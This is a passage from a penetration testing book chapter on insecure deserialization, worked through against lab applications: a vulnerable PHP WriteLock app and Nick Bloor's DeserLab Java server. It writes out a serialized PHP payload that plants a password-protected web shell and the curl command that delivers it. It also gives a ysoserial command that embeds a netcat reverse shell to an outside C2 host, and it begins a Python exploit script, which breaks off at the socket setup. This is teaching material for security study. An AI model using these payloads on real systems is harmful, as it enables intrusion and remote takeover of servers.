<html><head></head><body><div class="chapter" title="Chapter&#xA0;8.&#xA0;Bad Serialization"><div class="titlepage"><div><div><h1 class="title"><a id="ch08"/>Chapter 8. Bad Serialization</h1></div></div></div><p>
<span class="strong"><strong>Object serialization</strong></span> is <a id="id370" class="indexterm"/>an interesting programming concept that aims to take structured live data from memory and make it transmittable over the wire or easily stored somewhere for later use. An object, such as a memory structure of an application's database connection details, for example, can be serialized, or converted into an easy-to-transport stream of bytes, such as a human-readable string. A string representation of this memory structure can now be easily written to a text file or sent to another web application over HTTP. The serialized data string can then be used to instantiate the database object in memory, with the properties, such as database name or credentials, pre-populated. The receiving web application can recreate the memory structure by deserializing the string of bytes. Serialization is also referred to as marshalling, pickling, or flattening, and it is provided by many languages, including Java, PHP, Python, and Ruby.</p><p>Depending on the language, the serialized data may be represented as human-readable text, binary stream, or a combination of both. There are many uses for object serialization, such as inter-process communication, inter-system communication, data caching, or persistence.</p><p>In this chapter, we will be looking at the following:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem" style="list-style-type: disc">Understanding the deserialization process</li><li class="listitem" style="list-style-type: disc">Analyzing vulnerable application code</li><li class="listitem" style="list-style-type: disc">Exploiting deserialization to achieve code execution</li></ul></div><div class="section" title="Abusing deserialization"><div class="titlepage"><div><div><h1 class="title"><a id="ch08lvl1sec49"/>Abusing deserialization</h1></div></div></div><p>Exploiting<a id="id371" class="indexterm"/> deserialization relies on built-in methods, which execute automatically when an object is instantiated or destroyed. PHP, for example, provides several of these methods for every object:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem" style="list-style-type: disc"><code class="literal">__construct()</code></li><li class="listitem" style="list-style-type: disc"><code class="literal">__destruct()</code></li><li class="listitem" style="list-style-type: disc"><code class="literal">__toString()</code></li><li class="listitem" style="list-style-type: disc"><code class="literal">__wakeup()</code></li><li class="listitem" style="list-style-type: disc">…and more!</li></ul></div><p>When<a id="id372" class="indexterm"/> a new object is instantiated, <code class="literal">__construct()</code> is called; whereas when a new object is destroyed or during garbage collection, <code class="literal">__destruct()</code> is automatically executed. The <code class="literal">__toString()</code> method provides a way to represent the object in string format. This is different to serialization, as there is no <code class="literal">__fromString()</code> equivalent to read the data back. The <code class="literal">__wakeup()</code> method is executed when an object is deserialized and instantiated in memory.</p><p>PHP provides serialization capabilities via the <code class="literal">serialize()</code> and <code class="literal">unserialize()</code> functions. The output is a human-readable string that can be easily transferred over HTTP or other protocols. The string output describes the object, its properties, and the values. PHP can serialize boolean, array, integer, double, and string variables, and even instantiated classes (objects).</p><p>In the following example, we attempt to serialize a simple array object containing two key-value pairs: <code class="literal">database</code> with the value <code class="literal">users</code>, and <code class="literal">host</code> with the value <code class="literal">127.0.0.1</code>. The PHP source code to create this array structure in memory looks like this:</p><div class="informalexample"><pre class="programlisting">array(
  'database' =&gt; 'users',
  'host' =&gt; '127.0.0.1'
)</pre></div><p>When the source code is compiled and executed by the PHP engine, the <code class="literal">array</code> object is stored in a memory structure somewhere in RAM that only the processor knows how to access. If we wish to transfer <code class="literal">array</code> to another machine through a medium such as HTTP, we have to find all the bytes in memory that represent it, package them, and send them using a <code class="literal">GET</code> request or similar. This is where serialization comes into play.</p><p>The <code class="literal">serialize()</code> function in PHP will do just that for us: find the array structure in memory and return a string representation of it. We can test this by using the <code class="literal">php</code> binary on our Linux machine, and with the <code class="literal">-r</code> switch we can ask it to serialize our array, and return a representative string. The PHP code will echo the results to the screen:</p><div class="informalexample"><pre class="programlisting">root@kali:~# php -r<span class="strong"><strong> "echo serialize(array('database' =&gt; 'users', 'host' =&gt; '127.0.0.1'));"</strong></span>
a:2:{s:8:"database";s:5:"users";s:4:"host";s:9:"127.0.0.1";}</pre></div><p>The colon-separated output reads like this:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem" style="list-style-type: disc">The serialized data that follows is an array (<code class="literal">a</code>)</li><li class="listitem" style="list-style-type: disc">There are <code class="literal">2</code> elements in the array</li><li class="listitem" style="list-style-type: disc">The elements are wrapped in curly brackets (<code class="literal">{}</code>) and separated by semicolons (<code class="literal">;</code>)</li><li class="listitem" style="list-style-type: disc">The first element key is a string (<code class="literal">s</code>) of length <code class="literal">8</code> called <code class="literal">database</code>. Its value is a string (<code class="literal">s</code>) of length <code class="literal">5</code>: <code class="literal">users</code></li><li class="listitem" style="list-style-type: disc">The second key is a string (<code class="literal">s</code>) of length <code class="literal">4</code> called <code class="literal">host</code>. Its value is a string (<code class="literal">s</code>) of length <code class="literal">9</code>: <code class="literal">127.0.0.1</code></li></ul></div><p>This <a id="id373" class="indexterm"/>serialized data can be shared across systems or over the network, or stored in a database. When it is retrieved, the array structure can be rebuilt (unserialized) with the values already populated. Serialized objects instantiated from classes are no different to array objects; they simply contain a few more fields in the serialized result.</p><p>Take the sample class <code class="literal">WriteLock</code>, whose purpose it is to create a lock file in the <code class="literal">/tmp</code> directory when it is deserialized. This application will be stored in the <code class="literal">/var/www/html/lockapp</code> directory.</p><p>The following shows the <code class="literal">WriteLock</code> class PHP code:</p><div class="mediaobject"><img src="graphics/B09238_08_01.jpg" alt="Abusing deserialization"/><div class="caption"><p>Figure 8.1: The WriteLock class definition source code</p></div></div><p>The code can be a bit daunting to non-developers, but it's not very complicated at all. The <code class="literal">WriteLock</code> class has two public functions (or methods) available: <code class="literal">write()</code> and <code class="literal">__wakeup()</code>. The <code class="literal">write()</code> function will write the string <code class="literal">app_in_use</code> to the <code class="literal">/tmp/lockfile</code> file on the disk using PHP's built-in <code class="literal">file_put_contents</code> function. The <code class="literal">__wakeup()</code> method will simply sanity-check the properties and execute the <code class="literal">write()</code> function in the current object (<code class="literal">$this</code>). The idea here is that the lock file, <code class="literal">/tmp/lockfile</code>, will automatically be created when the <code class="literal">WriteLock</code> object is recreated in memory by deserialization.</p><p>First, we<a id="id374" class="indexterm"/> can see how the <code class="literal">WriteLock</code> object looks when it is serialized and ready for transmission. Remember that <code class="literal">__wakeup()</code> will only execute on deserialization, not when the object is instantiated.</p><p>The following code will include the <code class="literal">WriteLock</code> definition so that we can instantiate a <code class="literal">$lock</code> object from the <code class="literal">WriteLock</code> class using the <code class="literal">new</code> PHP keyword. The last line of the code will echo or return the serialized <code class="literal">$lock</code> object to the screen for inspection.</p><p>The following is the contents of the <code class="literal">serialize.php</code> file used for testing:</p><div class="mediaobject"><img src="graphics/B09238_08_02.jpg" alt="Abusing deserialization"/><div class="caption"><p>Figure 8.2: Source code to serialize a WriteLock object</p></div></div><p>The output of the serialized <code class="literal">$lock</code> object looks similar to the preceding array example. For clarity's sake, the following has been cleaned up and indented, but a typical serialized object will not contain formatting, such as indents and newlines.</p><p>Let's execute the <code class="literal">serialize.php</code> file using the <code class="literal">php</code> interpreter and observe the result:</p><div class="informalexample"><pre class="programlisting">root@kali:/var/www/html/lockapp#<span class="strong"><strong> php serialize.php</strong></span>

O:9:"WriteLock":2:{
  s:4:"file";
    s:13:"/tmp/lockfile";
  s:8:"contents";
    s:10:"app_in_use";
}</pre></div><p>The first few bytes denote an object (<code class="literal">o</code>) instantiated from the <code class="literal">WriteLock </code>class, which contains two properties, along with their respective values and lengths. There is one thing to note: for private class members, the names are prepended with the class name wrapped in null bytes. If the <code class="literal">WriteLock</code> properties <code class="literal">$file</code> and <code class="literal">$contents</code> were private, the serialized object would look like this:</p><div class="informalexample"><pre class="programlisting">O:9:"WriteLock":2:{
  s:4:"\<span class="strong"><strong>x00WriteLock\x00</strong></span>file";
    s:13:"/tmp/lockfile";
  s:8:"<span class="strong"><strong>\x00WriteLock\x00</strong></span>contents";
    s:10:"app_in_use";
}</pre></div><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note40"/>Note</h3><p>Null bytes are not normally visible in standard output. In the preceding example, the bytes were replaced by their hex equivalent <code class="literal">\x00</code> for clarity. If our payload includes private members, we may need to account for these bytes when transmitting payloads over mediums that interpret null bytes as string terminators. Typically, with HTTP we can escape null bytes using the percent sign preceding the hex representation of null, <code class="literal">00</code>. Instead of <code class="literal">\x00</code>, for HTTP, we'd simply use <code class="literal">%00</code>.</p></div></div><p>The <a id="id375" class="indexterm"/>following is a sample vulnerable implementation of the <code class="literal">WriteLock</code> class. The code receives a <code class="literal">WriteLock</code> serialized object via the <code class="literal">$_GET</code> PHP superglobal. The URL <code class="literal">GET</code> parameter containing the serialized object is <code class="literal">lock</code>, which is stored in a variable called <code class="literal">$data</code>. This serialized object is then deserialized using PHP's <code class="literal">unserialize()</code> in an attempt to restore the <code class="literal">WriteLock</code> object state in memory.</p><p>The following code will be stored in <code class="literal">index.php</code> and it illustrates a vulnerable implementation of object deserialization, which we will try to exploit. Data in the <code class="literal">$_GET</code> variable comes directly from user input and is passed as is to the <code class="literal">unserialize()</code> function:</p><div class="mediaobject"><img src="graphics/B09238_08_03.jpg" alt="Abusing deserialization"/><div class="caption"><p>Figure 8.3: The object deserialization source code</p></div></div><p>We cannot actually call the <code class="literal">write()</code> method provided by the <code class="literal">WriteLock</code> class when exploiting deserialization. We only really have control over the new object's properties. Thanks to PHP's <span class="strong"><strong>magic methods</strong></span>, however, we don't need to call <code class="literal">write()</code> directly, since, you'll recall, <code class="literal">__wakeup()</code> does it for us. Magic methods are called automatically at different stages in the object life cycle: on creation, on destruction, on restoration from a <a id="id376" class="indexterm"/>flat state (aka wakeup), or the serialization of live data (aka sleep).</p><p>In <span class="strong"><strong>property-oriented programming</strong></span> (<span class="strong"><strong>POP</strong></span>), a <span class="strong"><strong>gadget chain</strong></span> is the<a id="id377" class="indexterm"/> sequence of methods<a id="id378" class="indexterm"/> from existing code required to successfully hijack the application execution flow and do bad things. In our very simple example, the gadget chain we are triggering is just a quick hop from the <code class="literal">__wakeup()</code> magic method to <code class="literal">write()</code>.</p><p>The following shows the execution flow once the object is deserialized by <code class="literal">unserialize()</code>:</p><div class="mediaobject"><img src="graphics/B09238_08_04.jpg" alt="Abusing deserialization"/><div class="caption"><p>Figure 8.4: POP gadget in the WriteLock class</p></div></div><p>It's not very dramatic, but technically, it is a gadget chain.</p><p>If we only control the object properties, <code class="literal">$file</code> and <code class="literal">$contents</code>, how could we exploit this vulnerability? What if we try to write the <code class="literal">$contents</code> into another directory and file other than <code class="literal">/tmp</code>? Since we control both of these values, we can craft our serialized object to point to a file in the application web root, for example, <code class="literal">/var/www/html/lockapp/shell.php</code>, instead of the temporary folder, and set its contents to a simple web shell. When our malicious object is deserialized, the <code class="literal">__wakeup()</code> method will force a <code class="literal">write()</code> of our PHP shell to <code class="literal">/var/www/html/lockapp/shell.php</code>, instead of <code class="literal">/tmp/lockfile</code>.</p><p>Let's run a simple web server and bring the <code class="literal">WriteLock</code> application to life. The <code class="literal">php</code> interpreter can function as a standalone development server with the <code class="literal">-S</code> parameter, similar to Python's <code class="literal">SimpleHTTPServer</code>, with the added benefit of processing <code class="literal">.php</code> files before serving them.</p><p>We can use the <code class="literal">php</code> command <a id="id379" class="indexterm"/>to listen on the local system on port <code class="literal">8181</code>, as follows:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong>root@kali:/var/www/html/lockapp# php -S 0.0.0.0:8181</strong></span>
<span class="strong"><strong>Listening on http://0.0.0.0:8181</strong></span>
<span class="strong"><strong>Document root is /var/www/html/lockapp</strong></span>
<span class="strong"><strong>Press Ctrl-C to quit.</strong></span>
</pre></div><p>We can use the serialized object from our previous <code class="literal">serialize.php</code> test and just modify it slightly to weaponize it. We will change the <code class="literal">file</code> property value to <code class="literal">/var/www/html/lockapp/shell.php</code> and the <code class="literal">contents</code> property value to PHP shell code.</p><p>As before, we will use the following code with a simple password protection mechanism:</p><div class="mediaobject"><img src="graphics/B09238_08_05.jpg" alt="Abusing deserialization"/><div class="caption"><p>Figure 8.5: Web shell source code</p></div></div><p>The MD5 value we're looking for is the hash of <code class="literal">WriteLockTest1</code>, as confirmed by the <code class="literal">md5sum</code> Linux command:</p><div class="informalexample"><pre class="programlisting">root@kali:~# echo -n WriteLockTest1 | md5sum
<span class="strong"><strong>5d58f5270ce02712e8a620a4cd7bc5d3 -</strong></span>
root@kali:~#</pre></div><p>The serialized payload will look like this, again indented to make it more readable:</p><div class="informalexample"><pre class="programlisting">O:9:"WriteLock":2:{
  s:4:"file";
    s:<span class="strong"><strong>31</strong></span>:"<span class="strong"><strong>/var/www/html/lockapp/shell.php</strong></span>";
  s:8:"contents";
    s:<span class="strong"><strong>100</strong></span>:"<span class="strong"><strong>&lt;?php if (md5($_GET['password']) == '5d58f5270ce02712e8a620a4cd7bc5d3') { system($_GET['cmd']); } ?&gt;</strong></span>";
}</pre></div><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note41"/>Note</h3><p>We've updated the value for <code class="literal">file</code> and <code class="literal">contents</code>, along with the appropriate string length, <code class="literal">31</code> and <code class="literal">100</code> respectively, as shown in the preceding code block. If the length specified does not match the actual length of the property value, the attack will fail.</p></div></div><p>To exploit the deserialization <a id="id380" class="indexterm"/>vulnerability and hopefully write a PHP shell to the web root, we can use <code class="literal">curl</code> to pass our payload through a <code class="literal">GET</code> request. This will force the application to deserialize untrusted data and to create an object with dangerous property values.</p><p>We can call <code class="literal">curl</code> with the <code class="literal">-G</code> parameter, which instructs it to make a <code class="literal">GET</code> request, specify the URL of the vulnerable application, and also pass the URL encoded value for <code class="literal">lock</code> using the <code class="literal">--data-urlencode</code> switch.</p><p>Our serialized data contains single quotes, which can interfere with the execution of <code class="literal">curl</code> through the bash prompt. We should take care to escape them using a backslash (<code class="literal">\'</code>) as follows:</p><div class="informalexample"><pre class="programlisting">root@kali:~# curl -G http://0.0.0.0:8181/index.php --data-urlencode<span class="strong"><strong> $'lock=O:9:"WriteLock":2:{s:4:"file";s:31:"/var/www/html/lockapp/shell.php";s:8:"contents";s:100:"&lt;?php if (md5($_GET[\'password\']) == \'5d58f5270ce02712e8a620a4cd7bc5d3\') { system($_GET[\'cmd\']); } ?&gt;";}'</strong></span>
Lock initiated.</pre></div><p>The application responds with a <code class="literal">Lock initiated</code> message as expected. If the exploit was successful, we should be able to access the shell through a web browser, since the <code class="literal">shell.php</code> would have been written by the <code class="literal">__wakeup() -&gt; write()</code> POP gadget in the <code class="literal">/var/www/html/lockapp</code> directory.</p><div class="mediaobject"><img src="graphics/B09238_08_06.jpg" alt="Abusing deserialization"/><div class="caption"><p>Figure 8.6: The shell successfully executing the id program and displaying its result</p></div></div><p>Exploiting deserialization <a id="id381" class="indexterm"/>vulnerabilities in black-box PHP applications is difficult because it requires some knowledge of the source code. We need to have a proper gadget chain to execute our code. For this reason, attacks against applications usually involve gadgets from third-party libraries that have been used by application developers, which have their source code more readily available. This allows us to trace the code and build a gadget chain that will help us to take advantage of the vulnerability.</p><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note42"/>Note</h3><p>
<span class="strong"><strong>Packagist</strong></span> is a <a id="id382" class="indexterm"/>repository for PHP libraries and frameworks commonly used by application developers: <a class="ulink" href="https://packagist.org/">https://packagist.org/</a>.</p></div></div><p>To make development easier, the <span class="strong"><strong>Composer</strong></span> PHP framework provides a way for applications to automatically load libraries<a id="id383" class="indexterm"/> with a simple one-liner. This means that applications may have library code available, and therefore POP gadgets, when a vulnerable <code class="literal">unserialize()</code> method executes.</p><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note43"/>Note</h3><p>Composer can be found at <a class="ulink" href="https://getcomposer.org/">https://getcomposer.org/</a>.</p></div></div></div></div>
<div class="section" title="Attacking custom protocols"><div class="titlepage"><div><div><h1 class="title"><a id="ch08lvl1sec50"/>Attacking custom protocols</h1></div></div></div><p>Not unlike PHP, Java also <a id="id384" class="indexterm"/>provides the ability to flatten objects for easy transmission or storage. Where PHP-serialized data is simple strings, Java uses a slightly different approach. A serialized Java object is a stream of bytes with a header and the content split into blocks. It may not be easy to read, but it does stand out in packet captures or proxy logs as Base64-encoded values. Since this is a structured header, the first few bytes of the Base64 equivalent will be the same for every stream.</p><p>A Java-serialized object stream always starts with the magic bytes: <code class="literal">0xAC 0xED</code>, followed by a two byte version number: <code class="literal">0x00 0x05</code>. The rest of the bytes in the stream will describe the object and its contents. All we really need to spot this in the wild is the first two hex bytes, <code class="literal">ac ed</code>, and we'd know the rest of the stream is likely to be a Java-serialized object.</p><p>Researcher Nick Bloor has developed a wonderfully vulnerable application called <span class="strong"><strong>DeserLab</strong></span>, which <a id="id385" class="indexterm"/>showcases deserialization issues in applications that implement custom TCP protocols. DeserLab is not a typical application in that it may not be exposed to the web directly, but it may be used by web applications. DeserLab helps to showcase how Java-deserialization bugs can be exploited to wreak havoc.</p><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note44"/>Note</h3><p>DeserLab and Nick Bloor's research can be found on <a class="ulink" href="https://github.com/NickstaDB/">https://github.com/NickstaDB/</a>.</p></div></div><p>The attack technique we will go over translates very easily to HTTP-based attacks. It's not unusual for applications to read serialized Java objects from cookies or URL parameters. After all, facilitating inter-process or inter-server communication is one of the main benefits of serialization. For web applications, this data is usually Base64-encoded before transmission, making it easy to spot in proxy logs. Base64-encoded Java-serialized objects usually begin with the string <code class="literal">rO0ABX</code>, which decodes to <code class="literal">0xACED0005</code>, or the magic bytes and version number mentioned earlier.</p><p>To start a new instance of DeserLab, we can call the JAR file with the <code class="literal">-server</code> parameter, and specify the IP and port to listen on. For simplicity, we will be using <code class="literal">deserlab.app.internal</code> to connect to the vulnerable application once it is up and running. We will use the <code class="literal">java</code> binary to launch the DeserLab server component on the DeserLab target machine.</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong>root@deserlab:~/DeserLab-v1.0# java -jar DeserLab.jar -server </strong></span>
<span class="strong"><strong>0.0.0.0 4321</strong></span>
<span class="strong"><strong>[+] DeserServer started, listening on 0.0</strong></span>
<span class="strong"><strong>.0.0:4321</strong></span>
</pre></div><div class="section" title="Protocol analysis"><div class="titlepage"><div><div><h2 class="title"><a id="ch08lvl2sec33"/>Protocol analysis</h2></div></div></div><p>DeserLab is a <a id="id386" class="indexterm"/>straightforward application that provides string hashing services and is accessible by a custom client, built-in to the <code class="literal">DeserLab.jar</code> application file. With the DeserLab server <a id="id387" class="indexterm"/>component running on the target machine, we can launch the client component on our attacker machine, <code class="literal">kali</code>, with the <code class="literal">-client</code> switch, as follows:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong>root@kali:~/DeserLab-v1.0# java -jar DeserLab.jar -client deserlab.app.internal 4321</strong></span>
<span class="strong"><strong>[+] DeserClient started, connecting to </strong></span>
<span class="strong"><strong>deserlab.app.internal:4321</strong></span>
<span class="strong"><strong>[+] Connected, reading server hello packet...</strong></span>
<span class="strong"><strong>[+] Hello received, sending hello to server...</strong></span>
<span class="strong"><strong>[+] Hello sent, reading server protocol version...</strong></span>
<span class="strong"><strong>[+] Sending supported protocol version to the server...</strong></span>
<span class="strong"><strong>[...]</strong></span>
</pre></div><p>Once connected and the client-server <code class="literal">hello</code> handshake has completed, the client will prompt us for data to send to the server for processing. We can enter some test data and observe the response:</p><div class="informalexample"><pre class="programlisting">root@kali:~/DeserLab-v1.0# java -jar DeserLab.jar -client deserlab.app.internal 4321
[+] DeserClient started, connecting to deserlab.app.internal:4321
[+] Connected, reading server hello packet...
[+] Hello received, sending hello to server...
[+] Hello sent, reading server protocol version...
[+] Sending supported protocol version to the server...
[+] Enter a client name to send to the server:
<span class="strong"><strong>name</strong></span>
[+] Enter a string to hash:
<span class="strong"><strong>string</strong></span>
[+] Generating hash of<span class="strong"><strong> "string"...</strong></span>
[+] Hash generated:<span class="strong"><strong> </strong></span>
<span class="strong"><strong>b45cffe084dd3d20d928bee85e7b0f21</strong></span>
</pre></div><p>The application server component terminal log echoes the other side of the interaction. Notice the client-server hello and name message exchange; this will be important when we craft our exploit.</p><div class="informalexample"><pre class="programlisting">[+] Connection accepted from 10.0.2.54
[+] Sending hello...
[+] Hello sent, waiting for hello from client...
[+] Hello received from client...
[+] Sending protocol version...
[+] Version sent, waiting for version from client...
[+] Client version is compatible, reading client name...
[+] Client name received:<span class="strong"><strong> name</strong></span>
[+] Hash request received, hashing:<span class="strong"><strong> string</strong></span>
[+] Hash generated:<span class="strong"><strong> b45cffe084dd3d20d928bee85e7b0f21</strong></span>
</pre></div><p>Since this is a custom<a id="id388" class="indexterm"/> TCP protocol, we have to intercept the traffic using <span class="strong"><strong>Wireshark</strong></span> or <span class="strong"><strong>tcpdump</strong></span>, as opposed to <a id="id389" class="indexterm"/>Burp or ZAP. With Wireshark running, we can <a id="id390" class="indexterm"/>capture and inspect the TCP stream of data of our interaction with the DeserLab server, as the following figure shows:</p><div class="mediaobject"><img src="graphics/B09238_08_07.jpg" alt="Protocol analysis"/><div class="caption"><p>Figure 8.7: TCP stream of data</p></div></div><p>We can see the entire conversation in a hex dump format by analyzing the <span class="strong"><strong>packet capture</strong></span> (<span class="strong"><strong>pcap</strong></span>) generated<a id="id391" class="indexterm"/> by our packet sniffer. In the preceding figure, the data sent is the stream printed in light gray, while the darker parts represents the server response.</p><p>While the data may be a <a id="id392" class="indexterm"/>bit hard to read, each byte has a purpose. We can see the familiar <code class="literal">ac ed</code> header and the various inputs the client has sent, such as <code class="literal">name</code> and <code class="literal">string</code>. You'll also notice that the string value is a serialized <code class="literal">HashRequest</code> object. This is a Java class implemented by both the server and the client. Serialization is used to instantiate an object that will calculate the hash of a given input and store it in one of its properties. The packets we've just captured are the serialized representation of this object being transmitted from the client to the server and vice versa. The server-serialized object also contains an extra property: the generated hash.</p><p>When the server receives the client-generated serialized object, containing the inputted string to be hashed, it will deserialize the bytes coming in over the wire and attempt to cast them to the <code class="literal">HashRequest</code> class.</p><p>Since DeserLab is open-source, we can inspect the deserialization process on the server component by looking at its source code hosted on GitHub:</p><div class="informalexample"><pre class="programlisting">[...]
oos = new ObjectOutputStream(clientSock.getOutputStream());

//Read a HashRequest object
request = <span class="strong"><strong>(HashRequest)</strong></span>ois.readObject();

//Generate a hash
request.<span class="strong"><strong>setHash</strong></span>(generateHash(request.getData()));

oos.<span class="strong"><strong>writeObject</strong></span>(request);
[...]</pre></div><p>We see that the data is read in from the client using the <code class="literal">ObjectInputStream</code> (<code class="literal">ois</code>) object. This is just a fancy term for the data coming in from the client, which we've observed in the Wireshark packet capture to be the serialized <code class="literal">HashRequest</code> object. The next step is to attempt to cast the data read from <code class="literal">ois</code> to a <code class="literal">HashRequest</code> data structure. The reference to this new <code class="literal">HashRequest</code> object is then stored in the <code class="literal">request</code> variable, which can then be used as a normal object in memory. The server will get the input value of the string to be deserialized by calling request's <code class="literal">getData()</code> method, computing the hash, and storing it back into the object using <code class="literal">setHash()</code>. The <code class="literal">setHash</code> method is made available by the <code class="literal">HashRequest</code> class and all it does is populate a hash property within the object. The data is then serialized and written back to the network stream using <code class="literal">writeObject()</code>.</p><p>This works fine, but the <a id="id393" class="indexterm"/>code makes dangerous assumptions. It assumes that the data coming in from an untrusted source (the attacker) is actually a <code class="literal">HashRequest</code> object. If the data is anything other than something that can be safely cast to <code class="literal">HashRequest</code>, Java will throw an exception and as we will find out, by then it'll be too late.</p></div><div class="section" title="Deserialization exploit"><div class="titlepage"><div><div><h2 class="title"><a id="ch08lvl2sec34"/>Deserialization exploit</h2></div></div></div><p>Java deserialization attacks are <a id="id394" class="indexterm"/>possible because Java will execute a variety of methods in its quest to deserialize an object. If we control what properties these methods reference, we can control the execution flow of the application. This is POP and it is a code reuse attack similar to <span class="strong"><strong>return-oriented programming</strong></span> (<span class="strong"><strong>ROP</strong></span>). ROP is <a id="id395" class="indexterm"/>used in exploit development to execute code by referencing existing bytes in memory and taking advantage of the side effect of the x86 <code class="literal">return</code> instruction.</p><p>If we pass in a serialized object with the right properties, we can create an execution chain that eventually leads to code execution on the application server. This sounds like a tall order for the non-Java developer. After all, you have to be familiar with the inner workings of various libraries provided by Java or third-parties. Thankfully, a great tool exists to do the heavy lifting: <span class="strong"><strong>ysoserial</strong></span>.</p><p>The ysoserial tool was created by researcher Chris Frohoff to facilitate building serialized objects and weaponizing them to attack applications. It can build code execution payloads (POP chains) for many third-party libraries frequently used by Java applications:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem" style="list-style-type: disc"><code class="literal">Spring</code></li><li class="listitem" style="list-style-type: disc"><code class="literal">Groovy</code></li><li class="listitem" style="list-style-type: disc"><code class="literal">Commons Collections</code></li><li class="listitem" style="list-style-type: disc"><code class="literal">Jython</code></li><li class="listitem" style="list-style-type: disc">...and many more!</li></ul></div><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note45"/>Note</h3><p>ysoserial's source code and <a id="id396" class="indexterm"/>JAR files can be downloaded from <a class="ulink" href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a>.</p></div></div><p>We know that the target application uses the <code class="literal">Groovy</code> library because we have access to the JAR file and its source. This isn't always true with enterprise applications, however, and we may not always have access to <a id="id397" class="indexterm"/>the source code during an assessment. If the vulnerable application is running server-side and our only interaction with it is via an HTTP <code class="literal">GET</code> request, we'd have to rely on a separate information leak vulnerability to know what library to target for the POP gadget chain generation. Of course, the alternative is to simply try each known POP gadget chain until one succeeds. This is not as elegant and it is very noisy, but it may do the trick.</p><p>For this particular application, ysoserial can quickly generate a serialized object with the proper POP gadgets to execute code on applications implementing the <code class="literal">Groovy</code> library:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong>java -jar ysoserial.jar [payload_name] "[shell command to execute]"</strong></span>
</pre></div><p>In our case, the payload will be <code class="literal">Groovy1</code> and the command to execute is a netcat reverse shell back to our C2 server, <code class="literal">c2.spider.ml</code>, as shown:</p><div class="informalexample"><pre class="programlisting">root@kali:~/tools# java -jar ysoserial.jar Groovy1<span class="strong"><strong> "nc -v c2.spider.ml 443 -e /bin/bash" </strong></span>&gt; deserlab_payload.bin</pre></div><p>The bytes are printed to the console by default, so we have to pipe them to a file, <code class="literal">deserlab_payload.bin</code>, for use in our exploit. A hex dump of the generated payload shows the four familiar Java serialization magic bytes and version sequence, followed by the <code class="literal">0x73 0x72</code> flags, which further describe what data was serialized. We can observe the hex dump of the payload file using <code class="literal">xxd</code>, as shown:</p><div class="mediaobject"><img src="graphics/B09238_08_08.jpg" alt="Deserialization exploit"/></div><p>The preceding output was truncated because in order to generate a POP gadget that results in code execution, ysoserial creates a fairly large serialized object. By itself, this payload is not enough to attack DeserLab. We can't just connect to the server, send the payload bytes, and spawn a shell. The custom protocol implemented by DeserLab expects a few extra bytes to be sent before it attempts to cast the payload. You'll recall from our test packet capture that there's a client-server handshake preceding the hashing functionality. If we inspect that packet capture, we can find at what point in the communication stream we can inject our payload. We know that the server expects a serialized <code class="literal">HashRequest</code> object after the <code class="literal">name</code> string has been sent.</p><p>The indented lines are the packets received from the server and everything else is what we've sent with our client:</p><div class="mediaobject"><img src="graphics/B09238_08_09.jpg" alt="Deserialization exploit"/></div><p>Once again, we can see the <code class="literal">ac ed</code> magic <a id="id398" class="indexterm"/>bytes starting the stream, followed by the protocol hello packets: <code class="literal">0xF0 0x00 0xBA 0xAA</code>, and finally the protocol version <code class="literal">0x01 0x01</code>. Each packet sent by either the server or the client will be preceded by <code class="literal">0x77</code>, indicating a block of data is coming in and the length of that block (<code class="literal">0x02</code> in the case of the protocol version).</p><p>It's not terribly important that we understand what each byte means because we can clearly see where the serialized payload begins. The <code class="literal">0x73</code> and <code class="literal">0x72</code> bytes (which are the equivalent of the lowercase letters <code class="literal">s</code> and <code class="literal">r</code> respectively) represent the start of the serialized object, as shown in the following output:</p><div class="mediaobject"><img src="graphics/B09238_08_10.jpg" alt="Deserialization exploit"/></div><p>To feed a custom payload and exploit the application, we will write a Python script that will connect to the DeserLab application and:</p><div class="orderedlist"><ol class="orderedlist arabic"><li class="listitem">Send the hello packets</li><li class="listitem">Send the version number</li><li class="listitem">Send a name for the client: <code class="literal">test</code></li><li class="listitem">Send the exploit code generated with ysoserial</li></ol></div><p>To build our exploit code, we will use <a id="id399" class="indexterm"/>Python, as it makes sending data over the network simple. The beginning of the script will setup the environment and create a socket to the target host and port.</p><p>First, we will import the Python <code class="literal">socket</code> library and set a couple of variables that describe our target:</p><div class="informalexample"><pre class="programlisting">import socket

target_host = '<span class="strong"><strong>deserlab.app.internal</strong></span>'
target_port = <span class="strong"><strong>4321</strong></span>
</pre></div><p>We will reference these variables shortly. Next, we will read the <code class="literal">deserlab_payload.bin</code> file into a variable called <code class="literal">payload</code> using <code class="literal">open()</code>, <code class="literal">read()</code>, and finally <code class="literal">close()</code>, as shown in the following snippet:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong># Open the ysoserial generated exploit payload</strong></span>
print "[+] Reading payload file..."
f = <span class="strong"><strong>open</strong></span>(<span class="strong"><strong>'deserlab_payload.bin</strong></span>', 'rb')
<span class="strong"><strong>payload</strong></span> = f.<span class="strong"><strong>read</strong></span>()
f.<span class="strong"><strong>close</strong></span>()</pre></div><p>The <code class="literal">payload</code> variable now contains the raw bytes generated by ysoserial, which we will use to exploit the target host. The next step is to create a socket to the DeserLab server application and store the reference object in a variable called <code class="literal">target</code>. We will use this reference variable to send and receive data from the connection.</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong>target</strong></span> = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
